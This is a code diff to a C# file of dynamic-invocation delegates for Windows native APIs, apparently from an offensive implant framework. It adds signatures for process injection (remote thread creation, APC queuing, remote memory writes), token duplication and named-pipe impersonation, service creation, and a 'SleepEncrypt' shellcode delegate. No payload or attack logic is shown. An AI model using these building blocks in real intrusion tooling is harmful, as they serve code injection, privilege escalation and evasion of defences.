-                uint SectionPageProtection,
-                uint AllocationAttributes,
-                IntPtr FileHandle);
+            public delegate NTSTATUS NtCreateSection(ref IntPtr SectionHandle, uint DesiredAccess, IntPtr ObjectAttributes, ref ulong MaximumSize, uint SectionPageProtection, uint AllocationAttributes, IntPtr FileHandle);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate NTSTATUS NtUnmapViewOfSection(
-                IntPtr hProc,
-                IntPtr baseAddr);
+            public delegate NTSTATUS NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate NTSTATUS NtMapViewOfSection(
-                IntPtr SectionHandle,
-                IntPtr ProcessHandle,
-                out IntPtr BaseAddress,
-                IntPtr ZeroBits,
-                IntPtr CommitSize,
-                IntPtr SectionOffset,
-                out ulong ViewSize,
-                uint InheritDisposition,
-                uint AllocationType,
-                uint Win32Protect);
+            public delegate NTSTATUS NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, out IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, IntPtr SectionOffset, out ulong ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 LdrLoadDll(
-                IntPtr PathToFile,
-                UInt32 dwFlags,
-                ref UNICODE_STRING ModuleFileName,
-                ref IntPtr ModuleHandle);
+            public delegate UInt32 LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate void RtlInitUnicodeString(
-                ref UNICODE_STRING DestinationString,
-                [MarshalAs(UnmanagedType.LPWStr)]
-                string SourceString);
+            public delegate void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate void RtlZeroMemory(
-                IntPtr Destination,
-                int length);
+            public delegate void RtlZeroMemory(IntPtr Destination, int length);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtQueryInformationProcess(
-                IntPtr processHandle,
-                PROCESSINFOCLASS processInformationClass,
-                IntPtr processInformation,
-                int processInformationLength,
-                ref UInt32 returnLength);
+            public delegate UInt32 NtQueryInformationProcess(IntPtr processHandle, PROCESSINFOCLASS processInformationClass, IntPtr processInformation, int processInformationLength, ref UInt32 returnLength);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtOpenProcess(
-                ref IntPtr ProcessHandle,
-                h_reprobate.Win32.Kernel32.ProcessAccessFlags DesiredAccess,
-                ref OBJECT_ATTRIBUTES ObjectAttributes,
-                ref CLIENT_ID ClientId);
+            public delegate UInt32 NtOpenProcess(ref IntPtr ProcessHandle, h_DynInv.Win32.Kernel32.ProcessAccessFlags DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtQueueApcThread(
-                IntPtr ThreadHandle,
-                IntPtr ApcRoutine,
-                IntPtr ApcArgument1,
-                IntPtr ApcArgument2,
-                IntPtr ApcArgument3);
+            public delegate UInt32 NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtOpenThread(
-                ref IntPtr ThreadHandle,
-                h_reprobate.Win32.Kernel32.ThreadAccess DesiredAccess,
-                ref OBJECT_ATTRIBUTES ObjectAttributes,
-                ref CLIENT_ID ClientId);
+            public delegate UInt32 NtOpenThread(ref IntPtr ThreadHandle, h_DynInv.Win32.Kernel32.ThreadAccess DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtAllocateVirtualMemory(
-                IntPtr ProcessHandle,
-                ref IntPtr BaseAddress,
-                IntPtr ZeroBits,
-                ref IntPtr RegionSize,
-                h_reprobate.Win32.Kernel32.AllocationType AllocationType,
-                UInt32 Protect);
+            public delegate UInt32 NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, h_DynInv.Win32.Kernel32.AllocationType AllocationType, UInt32 Protect);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtFreeVirtualMemory(
-                IntPtr ProcessHandle,
-                ref IntPtr BaseAddress,
-                ref IntPtr RegionSize,
-                h_reprobate.Win32.Kernel32.AllocationType FreeType);
+            public delegate UInt32 NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, h_DynInv.Win32.Kernel32.AllocationType FreeType);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtQueryVirtualMemory(
-                IntPtr ProcessHandle,
-                IntPtr BaseAddress,
-                MEMORYINFOCLASS MemoryInformationClass,
-                IntPtr MemoryInformation,
-                UInt32 MemoryInformationLength,
-                ref UInt32 ReturnLength);
+            public delegate UInt32 NtQueryVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, MEMORYINFOCLASS MemoryInformationClass, IntPtr MemoryInformation, UInt32 MemoryInformationLength, ref UInt32 ReturnLength);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtProtectVirtualMemory(
-                IntPtr ProcessHandle,
-                ref IntPtr BaseAddress,
-                ref IntPtr RegionSize,
-                UInt32 NewProtect,
-                ref UInt32 OldProtect);
+            public delegate UInt32 NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtWriteVirtualMemory(
-                IntPtr ProcessHandle,
-                IntPtr BaseAddress,
-                IntPtr Buffer,
-                UInt32 BufferLength,
-                ref UInt32 BytesWritten);
+            public delegate UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength, ref UInt32 BytesWritten);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 RtlUnicodeStringToAnsiString(
-                ref ANSI_STRING DestinationString,
-                ref UNICODE_STRING SourceString,
-                bool AllocateDestinationString);
+            public delegate UInt32 RtlUnicodeStringToAnsiString(ref ANSI_STRING DestinationString, ref UNICODE_STRING SourceString, bool AllocateDestinationString);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 LdrGetProcedureAddress(
-                IntPtr hModule,
-                IntPtr FunctionName,
-                IntPtr Ordinal,
-                ref IntPtr FunctionAddress);
+            public delegate UInt32 LdrGetProcedureAddress(IntPtr hModule, IntPtr FunctionName, IntPtr Ordinal, ref IntPtr FunctionAddress);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 RtlGetVersion(
-                ref OSVERSIONINFOEX VersionInformation);
+            public delegate UInt32 RtlGetVersion(ref OSVERSIONINFOEX VersionInformation);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtReadVirtualMemory(
-                IntPtr ProcessHandle,
-                IntPtr BaseAddress,
-                IntPtr Buffer,
-                UInt32 NumberOfBytesToRead,
-                ref UInt32 NumberOfBytesRead);
+            public delegate UInt32 NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead);
 
             [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-            public delegate UInt32 NtOpenFile(
-                ref IntPtr FileHandle,
-                h_reprobate.Win32.Kernel32.FileAccessFlags DesiredAccess,
-                ref OBJECT_ATTRIBUTES ObjAttr,
-                ref IO_STATUS_BLOCK IoStatusBlock,
-                h_reprobate.Win32.Kernel32.FileShareFlags ShareAccess,
-                h_reprobate.Win32.Kernel32.FileOpenFlags OpenOptions);
+            public delegate UInt32 NtOpenFile(ref IntPtr FileHandle, h_DynInv.Win32.Kernel32.FileAccessFlags DesiredAccess, ref OBJECT_ATTRIBUTES ObjAttr, ref IO_STATUS_BLOCK IoStatusBlock, h_DynInv.Win32.Kernel32.FileShareFlags ShareAccess, h_DynInv.Win32.Kernel32.FileOpenFlags OpenOptions);
+
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint NtResumeThread(IntPtr ThreadHandle, out uint SuspendCount);
+
+            //ntWaitForSingleObject
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint NtWaitForSingleObject(IntPtr Handle, bool Alertable, IntPtr Timeout);
+        }
+
+        /// <summary>
+        /// Holds delegates for API calls in Kernel32.
+        /// </summary>
+        public struct KER32_DELEGATES
+        {
+            //get console window kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr GetConsoleWindow();
+
+            //allocate console kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool AllocConsole();
+
+            //get command line w kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr GetCommandLineW();
+            //get standard handle kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr GetStdHandle(int nStdHandle);
+            //get current thread id kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint GetCurrentThreadId();
+            // create process w kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool CreateProcessW(string lpApplicationName, string lpCommandLine, ref Win32.WinBase._SECURITY_ATTRIBUTES lpProcessAttributes, ref Win32.WinBase._SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Win32.ProcessThreadsAPI._STARTUPINFOEX lpStartupInfo, out Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);
+            //write process mem kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+            //VirtualProtect kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, Win32.Kernel32.MemoryProtection flNewProtect, out Win32.Kernel32.MemoryProtection lpflOldProtect);
+            //Queue User APC kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, uint dwData);
+            //resume thread kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint ResumeThread(IntPtr hThread);
+            //create thread kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr param, uint dwCreationFlags, ref uint lpThreadId);
+            //createRemoteThread
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);
+            //virtual alloc kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr VirtualAlloc(IntPtr lpStartAddr, uint size, uint flAllocationType, uint flProtect);
+            //virtual alloc Ex kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+            //wait for single object kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+            //Load Library kernel32 
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate IntPtr LoadLibraryW(string library);
+            //get proc address kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr GetProcAddress(IntPtr libPtr, string function);
+            //free library kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool FreeLibrary(IntPtr library);
+            // convert thread to fiber kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool ConvertThreadToFiber(IntPtr lpParameter);
+            // createFiber kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr CreateFiber(uint dwStackSize, uint lpStartAddress, IntPtr lpParameter);
+            //switch to fiber kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint SwitchToFiber(IntPtr lpFiber);
+            //get current thread kernel32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr GetCurrentThread();
+            // close handle 
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool CloseHandle(IntPtr hObject);
+            //get last error 
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate uint GetLastError();
+            //set std handle 
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool SetStdHandle(int nStdHandle, IntPtr hHandle);
+            //openprocess
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+            //IsWow64Process
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            [return: MarshalAs(UnmanagedType.Bool)]
+            public delegate bool IsWow64Process(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] out bool Wow64Process);
+            //createPipe
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref Win32.WinBase._SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
+            //CreateNamedPipe
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate IntPtr CreateNamedPipeW(string lpName, Win32.Kernel32.PipeOpenModeFlags dwOpenMode, Win32.Kernel32.PipeModeFlags dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);
+            //PeekNamedPipe
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool PeekNamedPipe(IntPtr hNamedPipe, byte[] lpBuffer, uint nBufferSize, ref uint lpBytesRead, ref uint lpTotalBytesAvail, ref uint lpBytesLeftThisMessage);
+            //createFile
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
+            public delegate IntPtr CreateFileW([MarshalAs(UnmanagedType.LPTStr)] string lpFileName, [MarshalAs(UnmanagedType.U4)] Win32.Kernel32.EFileAccess dwDesiredAccess, [MarshalAs(UnmanagedType.U4)] Win32.Kernel32.EFileShare dwShareMode, IntPtr lpSecurityAttributes, Win32.Kernel32.ECreationDisposition dwCreationDisposition, [MarshalAs(UnmanagedType.U4)] Win32.Kernel32.EFileAttributes dwFlagsAndAttributes, IntPtr hTemplateFile);
+            //readFile
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+            //SetHandleInfo
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool SetHandleInformation(IntPtr hObject, Win32.Kernel32.HANDLE_FLAGS dwMask, Win32.Kernel32.HANDLE_FLAGS dwFlags);
+            //connectNamedPipe
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);
+
+        }
+
+        /// <summary>
+        /// Holds delegates for ADVAPI32 API calls
+        /// </summary>
+        public struct ADVAPI32_DELEGATES
+        {
+            //logonUser
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, Win32.Advapi32.LOGON_TYPE dwLogonType, Win32.Advapi32.LOGON_PROVIDER dwLogonProvider, out IntPtr phToken);
+            //RevetToSelf
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool RevertToSelf();
+            //ImpersonateLoggedOnUser
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool ImpersonateLoggedOnUser(IntPtr hToken);
+            //openProcessToken
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool OpenProcessToken(IntPtr ProcessHandle, uint dwDesiredAccess, out IntPtr TokenHandle);
+            //duplicateTokenEx
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref Win32.WinBase._SECURITY_ATTRIBUTES lpTokenAttributes, Win32.WinNT._SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, Win32.WinNT.TOKEN_TYPE TokenType, out IntPtr phNewToken);
+            //CreateProcessWIthLogon
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool CreateProcessWithLogonW(string lpUsername, string lpDomain, string lpPassword, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo, out Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);
+            //CreateProcessAsUser
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto,SetLastError = true)]
+            public delegate bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, ref Win32.WinBase._SECURITY_ATTRIBUTES lpProcessAttributes, ref Win32.WinBase._SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo, out Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);
+            //getTokenInformation
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool GetTokenInformation(IntPtr TokenHandle, Win32.WinNT._TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);
+            //lookupPrivilegeName 
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
+            public delegate bool LookupPrivilegeName(string lpSystemName, ref Win32.WinNT._LUID lpLuid, StringBuilder lpName, ref int cchName);
+            //lookupPrivilegeValue
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Auto)]
+            public delegate bool LookupPrivilegeValue(string lpSystemName, string lpName, out Win32.WinNT._LUID lpLuid);
+            //OpenSCManager
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate IntPtr OpenSCManager(string lpMachineName, string lpDatabaseName, Win32.Advapi32.SCM_ACCESS dwDesiredAccess);
+            //StartService
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool StartService(IntPtr hService, uint dwNumServiceArgs, string[] lpServiceArgVectors);
+            //CloseServiceHandle
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool CloseServiceHandle(IntPtr hSCObject);
+            //CreateService
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate IntPtr CreateService(IntPtr hSCManager, string lpServiceName, string lpDisplayName, Win32.Advapi32.SERVICE_ACCESS dwDesiredAccess, Win32.Advapi32.SERVICE_TYPE dwServiceType, Win32.Advapi32.SERVICE_START dwStartType, Win32.Advapi32.SERVICE_ERROR dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword);
+            //AdjustTokenPrivileges
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref Win32.WinNT._TOKEN_PRIVILEGES NewState, int BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+            //impersonateNamedPipeClient
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);
+        }
+
+        /// <summary>
+        /// Holds delegates for USER32 API calls
+        /// </summary>
+        public struct USER32_DELEGATES
+        {
+            //show window user32
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        }
+
+        ///<summary>
+        /// holds delegates for the Userenv API calls
+        ///</summary>
+       public struct USERENV_DELEGATES
+        {
+            //delete profile
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate bool DeleteProfile(string lpSidString, string lpProfilePath, string lpComputerName);
+        }
+
+        /// <summary>
+        /// Holds delegates for Custom API calls. Mainly shellcode
+        /// </summary>
+        public struct CUSTOM_DELEGATES
+        {
+            //SleepEncrypt
+            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+            public delegate int SleepEncryptDelegate(IntPtr pARAMS);
+            //generic delegate
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate string GenericDelegate(string input);
+            //generic string out no args
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate string GenericNoArgsDelegate();
+            //generic delegate
+            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
+            public delegate string GenericArrayDelegate(string[] input);
         }
     }
 }
